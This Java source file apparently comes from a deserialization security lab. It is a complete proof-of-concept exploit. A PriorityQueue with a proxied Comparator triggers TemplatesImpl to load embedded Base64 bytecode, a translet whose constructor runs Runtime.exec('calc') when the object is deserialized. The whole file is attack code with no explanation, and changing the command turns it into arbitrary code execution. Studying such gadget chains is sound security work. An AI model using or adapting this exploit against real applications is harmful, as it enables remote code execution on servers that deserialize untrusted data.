package lab9;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.yxxx.javasec.deserialize.MyInvocationHandler;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.*;

public class Exp {
    public static void setField(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwcAHAcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAeAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHABwHABsBAApTb3VyY2VGaWxlAQALSGVsbG9ULmphdmEMAA8AEAcAHwwAIAAhAQAEY2FsYwwAIgAjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABkhlbGxvVAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAMAAwAAAAEAAEADQABAAgADgACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABAA0AAQAPABAAAQAKAAAAWAACAAIAAAASKrcAAbgAAhIDtgAEV6cABEyxAAEABAANABAABQACAAsAAAAWAAUAAAAUAAQAFwANABsAEAAZABEAHAARAAAAEAAC/wAQAAEHABIAAQcAEwAAAQAUAAAAAgAV");

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{code});
        setField(templates, "_name", "ameuu");
        setField(templates, "_tfactory", new TransformerFactoryImpl());
        setField(templates, "_class", null);

        MyInvocationHandler handler = new MyInvocationHandler();
        setField(handler, "type", Templates.class);
        Comparator proxy = (Comparator) Proxy.newProxyInstance(Exp.class.getClassLoader(), new Class[]{Comparator.class}, handler);


//        HashSet hashSet = new HashSet();
//        hashSet.add(templates);
//        hashSet.add(proxy);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(1);

        setField(priorityQueue, "queue", new Object[]{templates, 1});
        setField(priorityQueue, "comparator", proxy);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(priorityQueue);

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();

    }
}
